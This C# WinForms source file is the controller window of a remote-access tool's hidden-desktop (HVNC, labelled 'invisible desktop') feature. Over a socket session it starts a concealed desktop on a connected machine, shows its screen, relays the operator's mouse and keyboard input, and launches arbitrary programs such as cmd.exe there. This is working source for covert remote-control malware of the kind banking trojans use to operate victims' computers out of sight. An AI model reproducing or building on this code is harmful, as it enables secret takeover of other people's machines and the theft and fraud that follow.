using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using RemoteControl.Protocals;
using log4net;

namespace RemoteControl.Server
{
    public partial class FrmHVNC : FrmBase
    {
        private static readonly ILog Logger = LogManager.GetLogger(typeof(FrmHVNC));
        private SocketSession oSession;
        private bool _isCaptureMouse = false;
        private bool _isCaptureKeyboard = false;
        private int _currentFps = 5;

        public FrmHVNC(SocketSession session)
        {
            InitializeComponent();
            this.oSession = session;
        }

        #region Screen display

        public void HandleScreen(ResponseHVNCScreen resp)
        {
            if (resp == null || resp.ImageData == null)
                return;
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ResponseHVNCScreen>(HandleScreen), resp);
                return;
            }
            try
            {
                this.pictureBox1.Image = resp.GetImage();
            }
            catch (Exception ex)
            {
                Logger.Error("HVNC HandleScreen", ex);
            }
        }

        public void HandleStartResponse(ResponseHVNCStart resp)
        {
            if (resp == null) return;
            if (this.InvokeRequired)
            {
                this.Invoke(new Action<ResponseHVNCStart>(HandleStartResponse), resp);
                return;
            }
            if (resp.Result)
            {
                this.Text = "HVNC 隐形桌面 [" + resp.DesktopName + "] " +
                    resp.ScreenWidth + "x" + resp.ScreenHeight;
                toolStripButtonStart.Enabled = false;
                toolStripButtonStop.Enabled = true;
            }
            else
            {
                MessageBox.Show("HVNC启动失败: " + resp.Message, "错误",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion

        #region Toolbar events

        private void toolStripButtonStart_Click(object sender, EventArgs e)
        {
            RequestHVNCStart req = new RequestHVNCStart();
            req.Fps = _currentFps;
            oSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
            toolStripButtonStart.Enabled = false;
            toolStripButtonStop.Enabled = true;
        }

        private void toolStripButtonStop_Click(object sender, EventArgs e)
        {
            oSession.Send(ePacketType.PACKET_HVNC_STOP_REQUEST, null);
            toolStripButtonStart.Enabled = true;
            toolStripButtonStop.Enabled = false;
        }

        private void toolStripButtonRunProcess_Click(object sender, EventArgs e)
        {
            var dlg = new FrmInputUrl();
            dlg.Text = "启动程序 - 输入程序路径(cmd.exe)";
            dlg.ShowDialog();
            string input = dlg.InputText;
            if (!string.IsNullOrEmpty(input))
            {
                RequestHVNCRunProcess req = new RequestHVNCRunProcess();
                string[] parts = input.Split(new char[] { ' ' }, 2);
                req.FilePath = parts[0];
                req.Arguments = parts.Length > 1 ? parts[1] : "";
                oSession.Send(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, req);
            }
        }

        private void toolStripSplitButtonCapture_ButtonClick(object sender, EventArgs e)
        {
            toolStripSplitButtonCapture.ShowDropDown();
        }

        private void toolStripMenuItemCaptureMouse_Click(object sender, EventArgs e)
        {
            toolStripMenuItemCaptureMouse.Checked = !toolStripMenuItemCaptureMouse.Checked;
            _isCaptureMouse = toolStripMenuItemCaptureMouse.Checked;
        }

        private void toolStripMenuItemCaptureKeyboard_Click(object sender, EventArgs e)
        {
            toolStripMenuItemCaptureKeyboard.Checked = !toolStripMenuItemCaptureKeyboard.Checked;
            _isCaptureKeyboard = toolStripMenuItemCaptureKeyboard.Checked;
        }

        private void toolStripSplitButtonFPS_ButtonClick(object sender, EventArgs e)
        {
            toolStripSplitButtonFPS.ShowDropDown();
        }

        private void toolStripMenuItemFPS_Click(object sender, EventArgs e)
        {
            ToolStripMenuItem item = sender as ToolStripMenuItem;
            if (item == null || item.Tag == null) return;

            // Uncheck all
            foreach (ToolStripItem child in toolStripSplitButtonFPS.DropDownItems)
            {
                var mi = child as ToolStripMenuItem;
                if (mi != null) mi.Checked = false;
            }
            item.Checked = true;
            _currentFps = Convert.ToInt32(item.Tag);

            // Send updated fps
            RequestHVNCStart req = new RequestHVNCStart();
            req.Fps = _currentFps;
            oSession.Send(ePacketType.PACKET_HVNC_START_REQUEST, req);
        }

        #endregion

        #region Mouse events

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = (eMouseButtons)e.Button;
                req.MouseOperation = eMouseOperations.MouseDown;
                req.MouseLocation = e.Location;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = (eMouseButtons)e.Button;
                req.MouseOperation = eMouseOperations.MouseUp;
                req.MouseLocation = e.Location;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        private void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = (eMouseButtons)e.Button;
                req.MouseOperation = eMouseOperations.MouseDoubleClick;
                req.MouseLocation = e.Location;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (_isCaptureMouse && e.Button != MouseButtons.None)
            {
                RequestMouseEvent req = new RequestMouseEvent();
                req.MouseButton = (eMouseButtons)e.Button;
                req.MouseOperation = eMouseOperations.MouseMove;
                req.MouseLocation = e.Location;
                oSession.Send(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, req);
            }
        }

        #endregion

        #region Keyboard events

        private void FrmHVNC_KeyDown(object sender, KeyEventArgs e)
        {
            if (_isCaptureKeyboard)
            {
                RequestKeyboardEvent req = new RequestKeyboardEvent();
                req.KeyOperation = eKeyboardOpe.KeyDown;
                req.KeyCode = (eKeyboardKeys)e.KeyCode;
                req.KeyValue = e.KeyValue;
                req.KeyData = (eKeyboardKeys)e.KeyData;
                oSession.Send(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, req);
            }
        }

        private void FrmHVNC_KeyUp(object sender, KeyEventArgs e)
        {
            if (_isCaptureKeyboard)
            {
                RequestKeyboardEvent req = new RequestKeyboardEvent();
                req.KeyOperation = eKeyboardOpe.KeyUp;
                req.KeyCode = (eKeyboardKeys)e.KeyCode;
                req.KeyValue = e.KeyValue;
                req.KeyData = (eKeyboardKeys)e.KeyData;
                oSession.Send(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, req);
            }
        }

        #endregion

        #region Form closing

        private void FrmHVNC_FormClosing(object sender, FormClosingEventArgs e)
        {
            oSession.Send(ePacketType.PACKET_HVNC_STOP_REQUEST, null);
        }

        #endregion
    }
}
